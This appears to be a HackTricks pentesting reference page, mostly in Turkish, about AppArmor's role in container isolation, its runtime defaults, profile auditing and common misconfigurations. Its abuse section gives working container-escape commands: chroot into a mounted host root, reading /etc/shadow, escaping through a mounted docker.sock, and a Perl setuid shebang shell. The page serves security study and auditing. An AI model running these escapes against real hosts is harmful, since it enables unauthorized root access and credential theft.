# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir **Zorunlu Erişim Kontrolü** sistemidir. Kullanıcı ve grup sahipliğine büyük ölçüde dayanan geleneksel DAC kontrollerinin aksine, AppArmor çekirdeğin sürece iliştirilmiş bir politikayı uygulamasına izin verir. Container ortamlarında bu önemlidir çünkü bir iş yükü, geleneksel ayrıcalıklara sahip olsa ve bir işlemi denemeye yetecek yetkisi bulunsa bile, AppArmor profili ilgili yol, mount, ağ davranışı veya capability kullanımı izin vermediği için reddedilebilir.

En önemli kavramsal nokta AppArmor'un **path-based** olduğudur. AppArmor, SELinux'un yaptığı gibi etiketler üzerinden değil, yol kuralları üzerinden dosya sistemi erişimini değerlendirir. Bu, onu anlaşılır ve güçlü kılar, ancak bind mounts ve alternatif yol düzenlerinin dikkatle ele alınması gerektiği anlamına da gelir. Aynı host içeriği farklı bir yol üzerinden erişilebilir hale gelirse, politikanın etkisi operatörün ilk beklediği şekilde olmayabilir.

## Konteyner İzolasyonundaki Rolü

Konteyner güvenliği incelemeleri genellikle capabilities ve seccomp ile sınırlı kalır, ancak AppArmor bu kontrollerden sonra da önemini korur. Bir konteynerin olması gerekenden daha fazla ayrıcalığa sahip olduğunu ya da operasyonel sebeplerle ek bir capability gerektiğini düşünün. AppArmor yine de dosya erişimini, mount davranışını, ağ erişimini ve çalıştırma kalıplarını sınırlayarak belirgin kötüye kullanım yollarını engelleyebilir. Bu yüzden AppArmor'u "sadece uygulamayı çalıştırmak için" devre dışı bırakmak, yalnızca riskli bir yapılandırmayı sessizce aktif şekilde sömürülebilir hale dönüştürebilir.

## Laboratuvar

AppArmor'un host üzerinde aktif olup olmadığını kontrol etmek için şunu kullanın:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container process'in hangi kullanıcı/ortam altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Bu fark öğreticidir. Normal durumda, süreç runtime tarafından seçilen profile bağlı bir AppArmor bağlamı göstermelidir. Kısıtlanmamış durumda, bu ekstra kısıtlama katmanı ortadan kalkar.

Docker'ın hangi kuralları uyguladığını da inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Çalışma Zamanı Kullanımı

Docker, ana makine bunu desteklediğinde varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerle entegre olabiliyor; ancak SELinux-öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, AppArmor'u gerçek anlamda destekleyen düğümlerde iş yükü düzeyinde AppArmor politikasını açığa çıkarabilir. LXC ve ilişkili Ubuntu-aile sistem konteyner ortamları da AppArmor'u yoğun şekilde kullanır.

Pratik olarak, AppArmor bir "Docker özelliği" değildir. Birkaç runtime'ın uygulamayı seçebileceği bir ana makine-kernel özelliğidir. Ana makine bunu desteklemiyorsa veya runtime'a unconfined olarak çalışması söylenmişse, sözde koruma aslında mevcut değildir.

Kubernetes özelinde modern API `securityContext.appArmorProfile`'dır. Kubernetes `v1.30`'dan itibaren eski beta AppArmor açıklamaları kullanımdan kaldırılmıştır. Desteklenen ana makinelerde, varsayılan profil `RuntimeDefault` iken, `Localhost` düğümde zaten yüklenmiş olması gereken bir profile işaret eder. Bu, inceleme sırasında önemlidir çünkü bir manifest AppArmor-farkındalığı gösteriyor gibi görünebilir ancak tamamen düğüm tarafı desteğine ve önceden yüklenmiş profillere bağlı olabilir.

İnce ama kullanışlı bir operasyonel nokta: `appArmorProfile.type: RuntimeDefault`'ı açıkça ayarlamak, alanı sadece atlamaktan daha katıdır. Alan açıkça ayarlandıysa ve düğüm AppArmor'u desteklemiyorsa, admission başarısız olmalıdır. Alan atlanmışsa, iş yükü hâlâ AppArmor olmayan bir düğümde çalışabilir ve sadece o ek sınırlama katmanını almayabilir. Bir saldırgan bakış açısından, bu manifest'i ve gerçek düğüm durumunu kontrol etmek için iyi bir nedendir.

Docker-uyumlu AppArmor ana makinelerde en bilinen varsayılan `docker-default`'tır. Bu profil Moby'nin AppArmor şablonundan üretilir ve önemlidir çünkü bazı yetenek-temelli PoC'lerin varsayılan bir konteynerde neden hâlâ başarısız olduğunu açıklar. Genel olarak, `docker-default` normal ağ iletişimine izin verir, `/proc`'un büyük kısmına yazmayı engeller, `/sys`'in hassas bölümlerine erişimi reddeder, mount işlemlerini engeller ve ptrace'i genel bir ana makine keşif aracı olmaktan alıkoyacak şekilde sınırlar. Bu taban çizgisini anlamak, 'konteynerin `CAP_SYS_ADMIN`'a sahip olması' ile 'konteynerin gerçekten ilgilendiğim kernel arayüzlerine karşı bu yeteneği kullanabilmesi' arasındaki farkı ayırt etmeye yardımcı olur.

## Profil Yönetimi

AppArmor profilleri genellikle `/etc/apparmor.d/` altında depolanır. Yaygın bir adlandırma kuralı, yürütülebilir yolundaki eğik çizgileri noktalara çevirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` olarak saklanır. Bu detay savunma ve değerlendirme sırasında önemlidir çünkü aktif profil adını bir kez bildiğinizde, karşılık gelen dosyayı ana makinede genellikle hızlıca bulabilirsiniz.

Ana makine tarafında kullanışlı yönetim komutları şunlardır:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Bu komutların bir konteyner güvenliği referansında önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra nasıl değiştirildiğini açıklamalarıdır. Eğer bir operatör, sorun giderme sırasında profilleri complain mode'a alma ve enforcement'u geri getirmeyi unutma alışkanlığına sahipse, konteyner belgelerde korumalı görünürken gerçekte çok daha gevşek davranabilir.

### Profil Oluşturma ve Güncelleme

`aa-genprof` uygulama davranışını gözlemleyebilir ve bir profilin etkileşimli olarak oluşturulmasına yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profil oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Binary değiştiğinde ve politika güncellenmesi gerektiğinde, `aa-logprof` loglarda bulunan reddedilenleri yeniden oynatabilir ve operatörün bunları izin verip vermeyeceğine karar vermesinde yardımcı olabilir:
```bash
sudo aa-logprof
```
### Kayıtlar

AppArmor reddetmeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar aracılığıyla görülebilir:
```bash
sudo aa-notify -s 1 -v
```
Bu, operasyonel olarak ve saldırı amaçlı kullanımlarda faydalıdır. Savunma ekipleri bunu profilleri iyileştirmek için kullanır. Saldırganlar, hangi tam yolun veya işlemin engellendiğini ve AppArmor'un bir exploit chain'i engelleyen kontrol olup olmadığını öğrenmek için kullanır.

### Tam Profil Dosyasını Belirleme

Bir runtime, bir container için belirli bir AppArmor profil adı gösterdiğinde, bu adı diskteki profil dosyasına eşlemek genellikle faydalıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, özellikle host tarafı incelemesi sırasında çok faydalıdır; çünkü "konteyner `lowpriv` profili altında çalıştığını söylüyor" ile "gerçek kurallar denetlenip yeniden yüklenebilecek bu belirli dosyada bulunuyor" arasındaki boşluğu kapatır.

### İncelenmesi Gereken Önemli Kurallar

Bir profile erişebildiğinizde, basit `deny` satırlarında takılı kalmayın. Bazı kural türleri, bir container escape attempt sırasında AppArmor'un ne kadar işe yarayacağını önemli ölçüde değiştirebilir:

- `ux` / `Ux`: hedef ikiliyi kısıtlama olmadan çalıştırır. Eğer erişilebilir bir helper, shell veya interpreter `ux` altında izinliyse, genellikle test edilecek ilk şey odur.
- `px` / `Px` ve `cx` / `Cx`: exec sırasında profile geçişleri yapar. Bunlar otomatik olarak kötü değildir, ancak bir geçiş mevcut olandan çok daha geniş bir profile düşebilir; bu yüzden denetlenmeye değerdir.
- `change_profile`: bir görevin başka bir yüklü profile hemen veya bir sonraki exec'te geçmesini sağlar. Hedef profile daha zayıfsa, bu kısıtlayıcı bir domain'den çıkmak için kasıtlı bir kaçış yolu haline gelebilir.
- `flags=(complain)`, `flags=(unconfined)`, veya daha yeni `flags=(prompt)`: bunlar profile ne kadar güveneceğinizi değiştirmeli. `complain` reddedilmeleri uygulamak yerine loglar, `unconfined` sınırı kaldırır, ve `prompt` saf kernel-tarafından uygulanan deny yerine userspace karar yoluna bağlıdır.
- `userns` or `userns create,`: daha yeni AppArmor politikası user namespace'lerin oluşturulmasını araya alabilir. Bir container profile bunu açıkça izin veriyorsa, iç içe user namespaces, platform AppArmor'u sertleştirme stratejisinin bir parçası olarak kullansa bile etkide kalmaya devam eder.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
This kind of audit is often more useful than staring at hundreds of ordinary file rules. If a breakout depends on executing a helper, entering a new namespace, or escaping into a less restrictive profile, the answer is often hidden in these transition-oriented rules rather than in the obvious `deny /etc/shadow r` style lines.

## Misconfigurations

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## Abuse

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Eğer konteyner ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability'ye sahipse, en pratik testlerden biri AppArmor'un mount işlemlerini veya hassas kernel dosya sistemlerine erişimi engelleyen kontrol olup olmadığını test etmektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Bir host path zaten bir bind mount aracılığıyla erişilebilir durumdaysa, AppArmor'un kaybı read-only information-disclosure issue'u doğrudan host file access'e dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı AppArmor'un tek başına breakout oluşturması değildir. Amaç, AppArmor kaldırıldığında birçok filesystem ve mount-based istismar yolunun hemen test edilebilir hale gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Montelenmiş

Eğer konteyner zaten host root'unu `/host` altında bind-mounted olarak içeriyorsa, AppArmor'u kaldırmak engellenmiş bir filesystem istismar yolunu tam bir host escape'e dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Shell host dosya sistemi üzerinden çalıştığında, workload etkili bir şekilde container sınırını aşmış olur:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Eğer gerçek engel çalışma zamanı durumunu koruyan AppArmor ise, monte edilmiş bir socket tam bir kaçış için yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tam yol mount noktasına bağlıdır, fakat sonuç aynıdır: AppArmor artık runtime API erişimini engellemez ve runtime API ana makineyi tehlikeye atabilecek bir container başlatabilir.

### Tam Örnek: Path-Based Bind-Mount Bypass

AppArmor yol tabanlı olduğu için, `/proc/**`'yi korumak aynı host procfs içeriğini farklı bir yol üzerinden erişilebilir olduğunda otomatik olarak korumaz:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etkisi, tam olarak neyin bağlandığına ve alternatif yolun diğer kontrolleri de atlayıp atlamadığına bağlıdır; ancak bu desen, AppArmor'ın izole edilerek değil bağlama düzeniyle birlikte değerlendirilmesi gereken en açık nedenlerden biridir.

### Tam Örnek: Shebang Bypass

AppArmor politikası bazen bir yorumlayıcı yolunu, shebang işleme yoluyla betik yürütmesini tam olarak hesaba katmayacak şekilde hedefler. Tarihsel bir örnek, ilk satırı sınırlı bir yorumlayıcıya işaret eden bir betiğin kullanılmasıyla ilgiliydi:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profil niyeti ile gerçek yürütme semantiğinin farklılaşabileceğini hatırlatması açısından önemlidir. Konteyner ortamlarında AppArmor'u incelerken, yorumlayıcı zincirleri ve alternatif yürütme yolları özel dikkat gerektirir.

## Kontroller

Bu kontrollerin amacı üç soruyu hızlıca yanıtlamaktır: AppArmor ana makinede etkin mi, mevcut süreç kısıtlanmış mı ve runtime gerçekten bu konteyner'e bir profil uyguladı mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Burada dikkat çekici olanlar:

- Eğer `/proc/self/attr/current` `unconfined` gösteriyorsa, çalışma yükü AppArmor tarafından kısıtlanmıyor.
- Eğer `aa-status` AppArmor'un disabled veya not loaded olduğunu gösteriyorsa, runtime yapılandırmasındaki herhangi bir profil adı büyük ölçüde kozmetiktir.
- Eğer `docker inspect` `unconfined` veya beklenmeyen bir özel profil gösteriyorsa, bu genellikle bir dosya sistemi veya mount-tabanlı istismar yolunun işe yaramasının nedenidir.
- Eğer `/sys/kernel/security/apparmor/profiles` beklediğiniz profili içermiyorsa, runtime veya orchestrator yapılandırması tek başına yeterli değildir.
- Eğer sözde sertleştirilmiş bir profil `ux`, geniş `change_profile`, `userns` veya `flags=(complain)` tarzı kurallar içeriyorsa, pratik sınır profil adının ima ettiğinden çok daha zayıf olabilir.

Eğer bir container zaten operasyonel nedenlerle yükseltilmiş ayrıcalıklara sahipse, AppArmor'u etkin bırakmak genellikle kontrol altındaki bir istisna ile çok daha geniş bir güvenlik ihlali arasındaki farkı yaratır.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın elle zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-capable host'larda varsayılan olarak etkin | Üzerine yazılmadıkça `docker-default` AppArmor profilini kullanır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host'a bağımlı | AppArmor `--security-opt` aracılığıyla desteklenir, ancak kesin varsayılan host/runtime bağımlıdır ve Docker'ın belgelenmiş `docker-default` profiline kıyasla daha evrensel değildir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | Eğer `appArmorProfile.type` belirtilmemişse varsayılan `RuntimeDefault`'tır, ancak bu yalnızca node'da AppArmor etkinse uygulanır | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` zayıf bir profil ile, AppArmor desteği olmayan node'lar |
| containerd / CRI-O under Kubernetes | Node/runtime desteğini takip eder | Ortak Kubernetes tarafından desteklenen runtimeler AppArmor'u destekler, ancak gerçek yaptırım hâlâ node desteğine ve workload ayarlarına bağlıdır | Kubernetes satırıyla aynı; doğrudan runtime yapılandırması AppArmor'u tamamen atlayabilir |

AppArmor için en önemli değişken genellikle yalnızca runtime değil, **host**'tur. Bir manifestteki profil ayarı, AppArmor etkin olmayan bir node'da kısıtlama oluşturmaz.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
